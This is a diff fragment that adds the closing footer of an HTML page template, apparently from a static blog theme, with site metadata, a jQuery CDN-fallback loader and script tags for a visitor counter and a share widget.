+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "John Doe"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
